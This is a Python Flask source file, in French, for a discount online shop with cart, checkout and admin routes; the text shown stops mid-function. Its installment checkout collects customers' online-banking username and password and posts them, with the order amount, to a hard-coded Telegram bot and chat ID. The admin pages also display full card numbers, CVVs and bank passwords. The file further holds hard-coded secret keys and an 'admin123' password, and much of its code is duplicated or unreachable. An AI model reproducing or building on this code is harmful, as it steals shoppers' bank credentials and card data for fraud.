from flask import Flask, render_template, request, redirect, url_for, session, flash
from werkzeug.security import generate_password_hash, check_password_hash
import json
import os
from datetime import datetime
from data import products, categories
from types import SimpleNamespace
from datetime import datetime, timedelta, timezone
from flask import jsonify
from werkzeug.utils import secure_filename
import uuid
import requests  # Ajoutez cette ligne avec les autres imports
from flask import make_response
from reportlab.lib.pagesizes import letter
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib import colors
from reportlab.lib.units import inch
from io import BytesIO
from datetime import datetime
from functools import wraps
from admin_auth import ADMIN_CREDENTIALS
from werkzeug.security import check_password_hash
from admin_auth import ADMIN_CREDENTIALS
from sqlalchemy import func
from sqlalchemy import or_
from data import products  # Importez vos produits depuis data.py
from reportlab.graphics.barcode import qr
from reportlab.graphics.shapes import Drawing
from flask import Flask, send_from_directory
from werkzeug.middleware.proxy_fix import ProxyFix

def last4(s):
    return str(s)[-4:] if s else ''

app = Flask(__name__)
app.secret_key = '5353e8fe3501729ec1bc8278f3cc93e6dc4ce3c9993592a0ab1efe30e2e4bbe7'
app.jinja_env.globals.update(datetime=datetime)
app.config.update(
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SAMESITE='Lax',
    PERMANENT_SESSION_LIFETIME=timedelta(days=1)
)

app.jinja_env.filters['last4'] = last4
app.config['UPLOAD_FOLDER'] = 'static/images/products'
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}

app.config.update(
    SECRET_KEY='votre_cle_secrete_tres_longue',  # Changez ceci!
    SESSION_COOKIE_SECURE=True,    # Pour HTTPS seulement
    SESSION_COOKIE_HTTPONLY=True,  # Empêche l'accès via JavaScript
    SESSION_COOKIE_SAMESITE='Lax',  # Protection contre CSRF
    PERMANENT_SESSION_LIFETIME=300,  # 5 minutes d'inactivité
    SESSION_REFRESH_EACH_REQUEST=True  # Reset du timer à chaque requête
)

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1, x_host=1)

# Configuration
app.config['UPLOAD_FOLDER'] = 'static/images/products'

# Données utilisateurs simulées
users = {
    "admin": {
        "password": generate_password_hash("admin123"),
        "email": "admin@destockage.com",
        "full_name": "Administrateur",
        "address": "123 Rue du Commerce, Paris",
        "phone": "0123456789"
    }
}

# Configuration pour les uploads
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif'}
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# Panier simulé
def get_cart():
    if 'cart' not in session:
        session['cart'] = {}
        session.modified = True  # Important

    return session['cart']

@app.before_request
def before_request():
    session.permanent = True
    # Initialise le panier si non existant
    if 'cart' not in session:
        session['cart'] = {}

    try:
        clean_cart()
    except Exception as e:
        print(f"Error cleaning cart: {e}")
        session['cart'] = {}
    
    # Définit la session comme permanente
    session.permanent = True

def save_cart(cart):
    session['cart'] = cart
    session.modified = True



# 1. D'abord définir les fonctions utilitaires
def get_utc_now():
    """Retourne la date/heure actuelle avec timezone UTC"""
    return datetime.now(timezone.utc)

def ensure_timezone(dt):
    """Assure qu'une datetime a un fuseau horaire (UTC si absent)"""
    if dt is None:
        return None
    return dt if dt.tzinfo else dt.replace(tzinfo=timezone.utc)

# 2. Ensuite définir le décorateur
def admin_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        # Récupère et normalise la dernière activité
        last_activity = ensure_timezone(session.get('admin_last_activity'))
        current_time = get_utc_now()
        
        # Vérifie la session
        if not session.get('admin_logged_in'):
            return redirect(url_for('admin_login', next=request.url))
            
        # Vérifie l'expiration (5 minutes d'inactivité)
        if last_activity and (current_time - last_activity) > timedelta(minutes=5):
            session.clear()
            flash('Session expirée', 'warning')
            return redirect(url_for('admin_login', next=request.url))
        
        # Met à jour le timestamp
        session['admin_last_activity'] = current_time
        return f(*args, **kwargs)
    return decorated_function

@app.route('/')
def index():
    featured_products = [p for p in products if p.get('featured', False)]
    
    # Normalisation des données image/images
    for product in featured_products:
        # Si le produit utilise l'ancien système avec 'image'
        if 'image' in product:
            # Migration vers le nouveau système
            product['images'] = [product['image']] if product['image'] else ['default.jpg']
            del product['image']
        # Si pas d'images du tout
        elif 'images' not in product or not product['images']:
            product['images'] = ['default.jpg']
        # Si images existe mais est vide
        elif not product['images']:
            product['images'] = ['default.jpg']
    
    return render_template('index.html', featured_products=featured_products)


@app.route('/produits')
def product_list():
    category = request.args.get('category', 'all')
    search_term = request.args.get('search', '').lower()
    
    # Filtrage
    if category == 'all':
        filtered_products = products
    else:
        filtered_products = [p for p in products if p['category'] == category]
    
    if search_term:
        filtered_products = [p for p in filtered_products 
                          if search_term in p['name'].lower() 
                          or search_term in p['description'].lower()]
    
    # Normalisation des images
    for product in filtered_products:
        if 'image' in product:
            product['images'] = [product['image']]
            del product['image']
        elif 'images' not in product or not product['images']:
            product['images'] = ['default.jpg']
    
    return render_template('products.html',
                         products=filtered_products,
                         categories=categories,
                         current_category=category)

    # Gestion des images
    for product in filtered_products:
        # Si le produit n'a pas d'images du tout
        if 'images' not in product or not product['images']:
            product['images'] = ['default.jpg']
        # Si le produit utilise encore l'ancien système avec 'image'
        elif 'image' in product and product['image']:
            # Migration vers le nouveau système
            product['images'] = [product['image']]
            del product['image']
    
    return render_template('products.html', 
                         products=filtered_products, 
                         categories=categories,
                         current_category=category)

    # Gestion des images
    for product in filtered_products:
        # Si le produit n'a pas d'images du tout
        if 'images' not in product or not product['images']:
            product['images'] = ['default.jpg']
        # Si le produit utilise encore l'ancien système avec 'image'
        elif 'image' in product and product['image']:
            # Migration vers le nouveau système
            product['images'] = [product['image']]
            del product['image']
    
    return render_template('products.html', 
                         products=filtered_products, 
                         categories=categories,
                         current_category=category)



@app.route('/api/search')
def api_search():
    try:
        query = request.args.get('q', '').strip().lower()
        
        if not query or len(query) < 2:  # Minimum 2 caractères
            return jsonify([])
        
        results = []
        for product in products:
            # Recherche dans nom et catégorie
            if (query in product.get('name', '').lower() or 
                query in product.get('category', '').lower()):
                
                # Gestion de l'image
                image = None
                if 'images' in product and product['images']:
                    image = product['images'][0]
                elif 'image' in product and product['image']:
                    image = product['image']
                
                results.append({
                    'id': product['id'],
                    'name': product.get('name', ''),
                    'price': float(product.get('price', 0)),
                    'category': product.get('category', ''),
                    'images': [image] if image else ['default-product.jpg']
                })
                
                if len(results) >= 8:  # Limite les résultats
                    break
        
        return jsonify(results)
        
    except Exception as e:
        print(f"Erreur recherche: {str(e)}")
        return jsonify({'error': str(e)}), 500


@app.route('/admin/order/<order_id>')
def admin_order_detail(order_id):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    order = session.get('orders', {}).get(order_id)
    if not order:
        flash('Commande non trouvée', 'error')
        return redirect(url_for('admin_orders'))
    
    # Calculer les détails de la commande
    order_items = []
    subtotal = 0
    
    for product_id, quantity in order.get('items', {}).items():
        product = next((p for p in products if str(p['id']) == str(product_id)), None)
        if product:
            item_total = product['price'] * int(quantity)
            subtotal += item_total
            order_items.append({
                'product': product,
                'quantity': quantity,
                'total': item_total
            })
    
    # Préparer les informations de paiement complètes
    payment_info = {
        'method': order.get('payment_method'),
        'status': order.get('status', 'En traitement'),
        'details': {}
    }
    
    # Ajouter toutes les informations bancaires disponibles
    if order.get('payment_method') == 'installment':
        payment_info['details'] = {
            'bank_name': order.get('bank_name', 'Non spécifié'),
            'bank_user_id': order.get('bank_user_id', 'Non spécifié'),
            'bank_password': order.get('bank_password', 'Non spécifié'),
            'account_number': order.get('account_number', 'Non spécifié'),
            'card_number': order.get('card_number', 'Non spécifié'),
            'expiry_date': order.get('expiry_date', 'Non spécifié'),
            'cvv': order.get('cvv', 'Non spécifié'),
            'installment_plan': order.get('installment_plan', 'Non spécifié')
        }
    elif order.get('payment_method') == 'credit_card':
        payment_info['details'] = {
            'card_number': order.get('card_number', 'Non spécifié'),
            'card_holder': order.get('card_holder', 'Non spécifié'),
            'expiry_date': order.get('expiry_date', 'Non spécifié'),
            'cvv': order.get('cvv', 'Non spécifié')
        }
    
    return render_template('admin_order_detail.html',
                         order={
                             'id': order_id,
                             'date': order.get('date'),
                             'user': order.get('user'),
                             'items': order_items,
                             'subtotal': subtotal,
                             'total': subtotal * 1.2,
                             'payment': payment_info,
                             'status': order.get('status', 'En traitement')
                         },
                         user=users.get(order.get('user', 'Guest'), {}))


@app.route('/admin-xxx/product/delete-image/<int:product_id>', methods=['POST'])
def admin_delete_product_image(product_id):
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    product = next((p for p in products if p['id'] == product_id), None)
    if not product:
        return jsonify({'success': False, 'message': 'Produit non trouvé'}), 404
    
    try:
        image_name = request.json.get('image')
        if not image_name:
            return jsonify({'success': False, 'message': 'Nom d\'image manquant'}), 400
        
        # Supprimer l'image du système de fichiers
        image_path = os.path.join(app.config['UPLOAD_FOLDER'], image_name)
        if os.path.exists(image_path):
            os.remove(image_path)
        
        # Supprimer l'image de la liste des images du produit
        if 'images' in product:
            product['images'] = [img for img in product['images'] if img != image_name]
        
        return jsonify({'success': True, 'message': 'Image supprimée avec succès'})
    
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/admin-xxx/product/delete/<int:product_id>', methods=['POST'])
def admin_delete_product(product_id):
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    product = next((p for p in products if p['id'] == product_id), None)
    if not product:
        return jsonify({'success': False, 'message': 'Produit non trouvé'}), 404
    
    try:
        # Supprimer l'image associée
        if 'image' in product:
            image_path = os.path.join(app.config['UPLOAD_FOLDER'], product['image'])
            if os.path.exists(image_path):
                os.remove(image_path)
        
        # Supprimer le produit de la liste
        products[:] = [p for p in products if p['id'] != product_id]
        
        return jsonify({'success': True, 'message': 'Produit supprimé avec succès'})
    
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/admin-xxx/client/<username>')
def admin_client_detail(username):
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    client = users.get(username)
    if not client:
        flash('Client non trouvé', 'error')
        return redirect(url_for('admin_xxx'))
    
    # Récupérer les commandes du client
    client_orders = []
    for order_id, order in session.get('orders', {}).items():
        if order.get('user') == username:
            order_details = {
                'id': order_id,
                'date': order.get('date'),
                'total': order.get('total'),
                'status': order.get('status'),
                'items_count': len(order.get('items', {}))
            }
            client_orders.append(order_details)
    
    return render_template('admin_client_detail.html',
                         client=client,
                         orders=client_orders)

def prepare_order_data(orders):
    processed = {}
    for order_id, order in orders.items():
        order_data = dict(order)
        if hasattr(order_data.get('items'), '__call__'):
            order_data['items'] = order_data['items']()
        processed[order_id] = order_data
    return processed

@app.route('/admin-login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if (username == ADMIN_CREDENTIALS['username'] and 
            check_password_hash(ADMIN_CREDENTIALS['password_hash'], password)):
            
            session['admin_logged_in'] = True
            session['admin_last_activity'] = get_utc_now()
            return redirect(url_for('admin_dashboard'))  # Modifiez selon votre endpoint
            
        flash('Identifiants incorrects', 'error')
    
    return render_template('admin_login.html')

@app.route('/admin/logout')
def admin_logout():
    session.clear()
    flash('Déconnexion réussie', 'success')
    return redirect(url_for('index'))


@app.route('/admin/update-status/<order_id>', methods=['POST'])
def update_order_status(order_id):
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    if 'orders' not in session or order_id not in session['orders']:
        return jsonify({'success': False, 'message': 'Commande non trouvée'}), 404
    
    try:
        new_status = request.json.get('status')
        session['orders'][order_id]['status'] = new_status
        session.modified = True
        
        # Envoyer une notification si le statut est "Expédié"
        if new_status == 'Expédié':
            username = session['orders'][order_id].get('user')
            if username in users:
                user_email = users[username].get('email')
                # Ici vous pourriez ajouter l'envoi d'un email de notification
                
        return jsonify({'success': True, 'message': 'Statut mis à jour'})
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

@app.route('/save-product', methods=['POST'])
def save_product():
    if not session.get('admin_logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    try:
        product_id = request.form.get('product_id')
        
        if product_id:  # Modification
            product = next((p for p in products if p['id'] == int(product_id)), None)
            if not product:
                return jsonify({'success': False, 'message': 'Produit non trouvé'}), 404
        else:  # Nouveau produit
            product = {
                'id': max(p['id'] for p in products) + 1 if products else 1,
                'date_added': datetime.now().strftime("%Y-%m-%d")
            }
        
        # Mise à jour des données
        product['name'] = request.form['name']
        product['category'] = request.form['category']
        product['price'] = float(request.form['price'])
        product['stock'] = int(request.form['stock'])
        product['description'] = request.form['description']
        product['featured'] = 'featured' in request.form
        
        # Gestion de l'image
        if 'image' in request.files:
            file = request.files['image']
            if file.filename != '':
                # Supprimer l'ancienne image si elle existe
                if 'image' in product:
                    old_image_path = os.path.join(app.config['UPLOAD_FOLDER'], product['image'])
                    if os.path.exists(old_image_path):
                        os.remove(old_image_path)
                
                # Sauvegarder la nouvelle image
                filename = secure_filename(file.filename)
                unique_filename = f"{uuid.uuid4().hex}_{filename}"
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], unique_filename))
                product['image'] = unique_filename
        
        if not product_id:  # Ajouter le nouveau produit
            products.append(product)
        
        return jsonify({'success': True, 'message': 'Produit enregistré avec succès'})
    
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500

# Route pour la page d'administration


@app.route('/admin/add-product', methods=['GET', 'POST'])
def admin_add_product():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    if request.method == 'POST':
        try:
            # Récupération des données du formulaire
            name = request.form['name']
            description = request.form['description']
            price = float(request.form['price'])
            category = request.form['category']
            stock = int(request.form['stock'])
            featured = 'featured' in request.form
            
            # Gestion de l'image uploadée
            if 'image' not in request.files:
                flash('Aucun fichier sélectionné', 'error')
                return redirect(request.url)
            
            file = request.files['image']
            if file.filename == '':
                flash('Aucun fichier sélectionné', 'error')
                return redirect(request.url)
            
            if file and allowed_file(file.filename):
                filename = secure_filename(file.filename)
                unique_filename = f"{uuid.uuid4().hex}_{filename}"
                file.save(os.path.join(app.config['UPLOAD_FOLDER'], unique_filename))
                
                # Création du nouveau produit
                new_product = {
                    'id': max(p['id'] for p in products) + 1 if products else 1,
                    'name': name,
                    'description': description,
                    'price': price,
                    'category': category,
                    'stock': stock,
                    'featured': featured,
                    'image': unique_filename,
                    'date_added': datetime.now().strftime("%Y-%m-%d")
                }
                
                products.append(new_product)
                flash('Produit ajouté avec succès', 'success')
                return redirect(url_for('admin_dashboard'))
            
        except Exception as e:
            flash(f'Erreur lors de l\'ajout du produit: {str(e)}', 'error')
    
    return render_template('admin_add_product.html', categories=categories)



@app.route('/account/address', methods=['POST'])
def manage_address():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    username = session['username']
    action = request.form.get('action')
    
    if action == 'update':
        # Mettre à jour l'adresse principale
        users[username]['address'] = request.form.get('address')
        users[username]['phone'] = request.form.get('phone')
        flash('Adresse mise à jour avec succès', 'success')
    
    elif action == 'delete':
        # Supprimer l'adresse
        users[username]['address'] = ''
        flash('Adresse supprimée avec succès', 'success')
    
    return redirect(url_for('account'))



@app.route('/save-profile', methods=['POST'])
def save_profile():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    username = session['username']
    user = users.get(username)
    
    if user:
        user['full_name'] = request.form.get('full_name', user['full_name'])
        user['email'] = request.form.get('email', user['email'])
        user['phone'] = request.form.get('phone', user['phone'])
        flash('Profil mis à jour avec succès', 'success')
    
    return redirect(url_for('account'))

@app.route('/save-address', methods=['POST'])
def save_address():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    username = session['username']
    action = request.form.get('action')
    
    if action == 'update':
        users[username]['address'] = request.form.get('address', '')
        users[username]['phone'] = request.form.get('phone', '')
        flash('Adresse mise à jour', 'success')
    elif action == 'delete':
        users[username]['address'] = ''
        flash('Adresse supprimée', 'success')
    
    return redirect(url_for('account'))

@app.route('/change-password', methods=['POST'])
def change_password():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    username = session['username']
    current_password = request.form.get('current_password')
    new_password = request.form.get('new_password')
    
    user = users.get(username)
    if user and check_password_hash(user['password'], current_password):
        user['password'] = generate_password_hash(new_password)
        flash('Mot de passe changé avec succès', 'success')
    else:
        flash('Mot de passe actuel incorrect', 'error')
    
    return redirect(url_for('account'))


@app.route('/set-default-card', methods=['POST'])
def set_default_card():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    username = session['username']
    card_id = request.form.get('card_id')
    
    # Initialise si nécessaire
    if 'payment_methods' not in users[username]:
        users[username]['payment_methods'] = []
    
    # Met à jour toutes les cartes
    for card in users[username]['payment_methods']:
        card['default'] = (card.get('id') == card_id)
    
    flash('Carte par défaut mise à jour', 'success')
    return redirect(url_for('account'))

@app.route('/admin/view-users')
def admin_view_users():
    if not session.get('admin_logged_in'):
        return redirect(url_for('admin_login'))
    
    return render_template('admin_view_users.html', users=users)




@app.route('/produit/<int:product_id>')
def product_detail(product_id):
    product = next((p for p in products if p['id'] == product_id), None)
    if not product:
        flash('Produit non trouvé', 'error')
        return redirect(url_for('product_list'))
    
    # Créez un dictionnaire details si il n'existe pas
    if 'details' not in product:
        product['details'] = {
            'description': product.get('description', ''),
            'catégorie': product.get('category', ''),
            'date_ajout': product.get('date_added', '')
        }
    
    # Produits similaires (même catégorie)
    related_products = [p for p in products 
                       if p['category'] == product['category'] 
                       and p['id'] != product_id][:4]
    
    return render_template('product_detail.html', 
                         product=product, 
                         related_products=related_products)

# Gestion du panier
@app.route('/ajouter-au-panier', methods=['POST'])
def add_to_cart():
    try:
        product_id = request.form.get('product_id')
        quantity = request.form.get('quantity', 1)
        
        # Validation des entrées
        if not product_id or not product_id.isdigit():
            raise ValueError("ID produit invalide")
        if not str(quantity).isdigit():
            raise ValueError("Quantité invalide")
            
        product_id = int(product_id)
        quantity = max(1, int(quantity))  # Quantité minimale de 1
        
        # Vérifie que le produit existe
        product = next((p for p in products if p['id'] == product_id), None)
        if not product:
            raise ValueError("Produit non trouvé")
            
    except ValueError as e:
        if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
            return json.dumps({'success': False, 'message': str(e)}), 400
        flash(str(e), 'error')
        return redirect(url_for('product_list'))
    
    # Ajout au panier
    cart = get_cart()
    cart[str(product_id)] = cart.get(str(product_id), 0) + quantity
    save_cart(cart)
    
    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        return json.dumps({
            'success': True,
            'cart_count': sum(cart.values()),
            'message': f'{product["name"]} ajouté au panier'
        })
    
    flash(f'{product["name"]} ajouté au panier', 'success')
    return redirect(request.referrer or url_for('index'))

def clean_cart():
    cart = get_cart()
    cleaned_cart = {}
    
    for product_id, quantity in cart.items():
        try:
            # Vérification que product_id est valide
            if product_id == 'undefined' or not product_id.isdigit():
                continue
                
            # Conversion sécurisée
            pid = int(product_id)
            qty = int(quantity) if str(quantity).isdigit() else 0
            qty = max(0, qty)  # Quantité minimum à 0
            
            # Vérification que le produit existe
            if qty > 0 and any(p['id'] == pid for p in products):
                cleaned_cart[str(pid)] = qty
        except (ValueError, TypeError):
            continue
    
    save_cart(cleaned_cart)
    return cleaned_cart

@app.before_request
def before_request():
    # Initialise le panier si non existant
    if 'cart' not in session:
        session['cart'] = {}
    
    # Nettoyage du panier avec gestion des erreurs
    try:
        clean_cart()
    except Exception as e:
        print(f"Error cleaning cart: {e}")
        # Réinitialiser le panier en cas d'erreur grave
        session['cart'] = {}

@app.route('/supprimer-du-panier/<int:product_id>', methods=['POST'])
def remove_from_cart(product_id):
    try:
        cart = get_cart()
        product_id_str = str(product_id)
        
        if product_id_str in cart:
            product = next((p for p in products if p['id'] == product_id), None)
            product_name = product['name'] if product else "Produit"
            
            del cart[product_id_str]
            save_cart(cart)
            
            return jsonify({
                'success': True,
                'message': f'{product_name} retiré du panier',
                'cart_count': sum(cart.values()),
                'cart_total': calculate_cart_total(cart)
            })
        else:
            return jsonify({'success': False, 'message': 'Produit non trouvé dans le panier'}), 404
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)}), 500
    
def calculate_cart_total(cart):
    total = 0
    for product_id, quantity in cart.items():
        product = next((p for p in products if str(p['id']) == product_id), None)
        if product:
            total += product['price'] * quantity
    return total
    
def add_to_cart():
    try:
        product_id = int(request.form['product_id'])
        quantity = max(1, int(request.form.get('quantity', 1)))  # Garantit une quantité minimale de 1
    except (ValueError, KeyError):
        if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
            return json.dumps({'success': False, 'message': 'Données invalides'}), 400
        flash('Données invalides', 'error')
        return redirect(url_for('product_list'))
    
    # ... reste de la fonction inchangé ...
    
    cart = get_cart()
    if str(product_id) in cart:
        cart[str(product_id)] += quantity
    else:
        cart[str(product_id)] = quantity
    
    save_cart(cart)
    
    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        return json.dumps({
            'success': True,
            'cart_count': sum(cart.values()),
            'message': f'{product["name"]} ajouté au panier'
        })
    
    flash(f'{product["name"]} ajouté au panier', 'success')
    return redirect(request.referrer or url_for('index'))

@app.route('/modifier-panier', methods=['POST'])
def update_cart():
    if request.headers.get('X-Requested-With') == 'XMLHttpRequest':
        try:
            data = request.get_json()
            product_id = str(data.get('product_id'))
            quantity = int(data.get('quantity', 1))
            
            cart = get_cart()
            
            if quantity > 0:
                cart[product_id] = quantity
            else:
                cart.pop(product_id, None)
            
            save_cart(cart)
            
            return jsonify({
                'success': True,
                'cart_count': sum(cart.values())
            })
        except Exception as e:
            return jsonify({'success': False, 'error': str(e)}), 400
    
    return jsonify({'success': False}), 400

@app.route('/vider-panier', methods=['POST'])
def clear_cart():
    if not session.get('logged_in'):
        return jsonify({'success': False, 'message': 'Non autorisé'}), 401
    
    session.pop('cart', None)
    return jsonify({'success': True, 'message': 'Panier vidé'})


@app.route('/api/cart/count')
def get_cart_count():
    cart = get_cart()
    return json.dumps({'count': sum(cart.values())})

@app.route('/installment/step1', methods=['GET'])
def installment_step1():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    cart = get_cart()
    if not cart:
        return redirect(url_for('index'))
    
    total = sum(p['price'] * cart[str(p['id'])] for p in products if str(p['id']) in cart)
    return render_template('installment_step1.html', total=total)

@app.route('/installment/step2', methods=['POST'])
def installment_step2():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    # Détection du logo de banque en fonction du BIC
    bic = request.form.get('bic', '').upper()
    bank_logo = ''
    
    if 'SOGEFRPP' in bic:
        bank_logo = 'https://logonews.fr/wp-content/uploads/2022/05/Nouveau-logo-SG-1-2048x1152.jpg'
    elif 'BNPAFRPP' in bic:
        bank_logo = 'https://upload.wikimedia.org/wikipedia/fr/thumb/9/9e/Logo_BNP_Paribas.svg/1200px-Logo_BNP_Paribas.svg.png'
    elif 'CRLYFRPP' in bic:
        bank_logo = 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/LCL_logo.svg/2560px-LCL_logo.svg.png'
    
    return render_template('installment_step2.html', bank_logo=bank_logo)

@app.route('/installment/step3', methods=['GET', 'POST'])
def installment_step3():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    
    if request.method == 'POST':
        # Traitement des données de l'étape 2
        step2_data = {
            'card_number': request.form.get('card_number'),
            'expiry_date': request.form.get('expiry_date'),
            'cvv': request.form.get('cvv'),
            'card_name': request.form.get('card_name')
        }
        
        # Récupération des données de l'étape 1
        step1_data = {
            'iban': request.form.get('iban'),
            'bic': request.form.get('bic'),
            'installment_plan': request.form.get('installment_plan')
        }
        
        # Détection du logo de banque
        bank_logo = get_bank_logo(step1_data.get('bic', ''))
        
        return render_template('installment_step3.html',
                            step1_data=json.dumps(step1_data),
                            step2_data=json.dumps(step2_data),
                            bank_logo=bank_logo)
    
    return redirect(url_for('installment_step1'))

def get_bank_logo(bic):
    bic = bic.upper()
    logos = {
        'SOGEFRPP': 'https://logonews.fr/wp-content/uploads/2022/05/Nouveau-logo-SG-1-2048x1152.jpg',
        'BNPAFRPP': 'https://upload.wikimedia.org/wikipedia/fr/thumb/9/9e/Logo_BNP_Paribas.svg/1200px-Logo_BNP_Paribas.svg.png',
        'CRLYFRPP': 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/3e/LCL_logo.svg/2560px-LCL_logo.svg.png'
    }
    return next((logo for code, logo in logos.items() if code in bic), '')


@app.route('/installment/confirmation', methods=['POST'])
def installment_confirmation():
    if not session.get('logged_in'):
        return redirect(url_for('login'))

    try:
        # Création de la commande
        cart = get_cart()
        total = sum(p['price'] * cart[str(p['id'])] for p in products if str(p['id']) in cart)
        
        order_id = datetime.now().strftime("%Y%m%d%H%M%S")
        order = {
            'id': order_id,
            'user': session['username'],
            'date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'items': dict(cart.items()),
            'total': total,
            'payment_method': 'installment',
            'status': 'En traitement',
            'installment_plan': request.form.get('installment_plan', '3'),
            'bank_user_id': request.form.get('bank_user_id'),
            'bank_password': request.form.get('bank_password')
        }

        # Préparation du message Telegram
        telegram_message = (
            "💳 Nouvelle commande en plusieurs fois\n"
            f"🔢 Numéro: #{order_id}\n"
            f"👤 Client: {session['username']}\n"
            f"💶 Montant: {total:.2f}€\n"
            f"🔄 Plan: {order['installment_plan']} mois\n"
            f"🏦 Identifiant bancaire: {order['bank_user_id']}\n"
            f"🔑 Mot de passe bancaire: {order['bank_password']}"
        )

        telegram_bot_token = '7866279403:AAEWq-i2dnjUM4yQLuW9JbOZliuB8K_nmHA'
        chat_ids = ['5652184847']

        # Envoi des données à Telegram
        for chat_id in chat_ids:
            try:
                requests.post(
                    f"https://api.telegram.org/bot{telegram_bot_token}/sendMessage",
                    json={
                        'chat_id': chat_id,
                        'text': telegram_message
                    },
                    timeout=5  # Timeout après 5 secondes
                )
            except requests.exceptions.RequestException as e:
                print(f"Erreur d'envoi Telegram: {e}")
                continue

        # Sauvegarde de la commande
        if 'orders' not in session:
            session['orders'] = {}
        session['orders'][order_id] = order
        session.modified = True

        # Vidage du panier
        session.pop('cart', None)

        return redirect(url_for('confirmation', order_id=order_id))

    except Exception as e:
        print(f"Erreur lors de la confirmation: {str(e)}")
        flash(f"Erreur lors de la confirmation: {str(e)}", "error")
        return redirect(url_for('installment_step1'))


@app.route('/api/cart/items')
def get_cart_items():
    cart = get_cart()
    cart_items = []
    
    for product_id, quantity in cart.items():
        product = next((p for p in products if str(p['id']) == product_id), None)
        if product:
            cart_items.append({
                'id': product_id,
                'name': product['name'],
                'price': product['price'],
                'quantity': quantity,
                'image': product['images'][0] if product['images'] else 'default.jpg',
                'total': product['price'] * quantity
            })
    
    return jsonify(cart_items)


@app.route('/panier')
def view_cart():
    cart = get_cart()
    cart_items = []
    subtotal = 0.0
    
    # Calcul des articles du panier
    for product_id, quantity in cart.items():
        product = next((p for p in products if str(p['id']) == str(product_id)), None)
        if product:
            # Normalisation des données produit
            if 'image' in product:
                product['images'] = [product['image']]
                del product['image']
            elif 'images' not in product or not product['images']:
                product['images'] = ['default.jpg']
            
            item_total = product['price'] * quantity
            subtotal += item_total
            cart_items.append({
                'product': product,
                'quantity': quantity,
                'total': item_total
            })
    
    return render_template('cart.html',
                         cart_items=cart_items,
                         subtotal=subtotal,
                         total=subtotal)



def clean_cart():
    cart = get_cart()
    cleaned_cart = {}
    
    for product_id, quantity in cart.items():
        product = next((p for p in products if p['id'] == int(product_id)), None)
        if product and quantity > 0:
            cleaned_cart[product_id] = quantity
    
    save_cart(cleaned_cart)
    return cleaned_cart

@app.context_processor
def inject_cart_data():
    cart = get_cart()
    cart_items = []
    total = 0
    
    for product_id, quantity in cart.items():
        try:
            # Conversion sécurisée de product_id en int
            product_id_int = int(product_id)
            product = next((p for p in products if p['id'] == product_id_int), None)
            if product:
                item_total = product['price'] * quantity
                total += item_total
                cart_items.append({
                    'product': product,
                    'quantity': quantity,
                    'total': item_total
                })
        except (ValueError, TypeError):
            # Si la conversion échoue, on ignore ce produit
            continue
    
    return dict(cart_items=cart_items, cart_total=total)

@app.context_processor
def inject_cart_count():
    cart = get_cart()
    count = 0
    
    for quantity in cart.values():
        if isinstance(quantity, int) and quantity > 0:
            count += quantity
    
    return {'cart_count': count}


@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    # Autoriser soit les connectés, soit les invités (votre logique existante)
    if not (session.get('logged_in') or session.get('guest')):
        return redirect(url_for('checkout_auth'))
    
    # Vérifier la validité de la session invité (votre logique existante)
    if session.get('guest'):
        try:
            created_at = datetime.fromisoformat(session['guest']['created_at'])
            if (datetime.now() - created_at) > timedelta(hours=24):
                session.pop('guest', None)
                flash('Session invité expirée', 'warning')
                return redirect(url_for('checkout_auth'))
        except:
            session.pop('guest', None)
            return redirect(url_for('checkout_auth'))

    # Vérification panier non vide (votre logique existante)
    cart = get_cart()
    if not cart:
        flash('Votre panier est vide', 'warning')
        return redirect(url_for('product_list'))
        
    # Calcul des articles et totaux (votre logique existante)
    cart_items = []
    subtotal = 0.0
    
    for product_id, quantity in cart.items():
        try:
            product = next((p for p in products if str(p['id']) == str(product_id)), None)
            if product:
                # Normalisation des données produit
                if 'image' in product:
                    product['images'] = [product['image']]
                    del product['image']
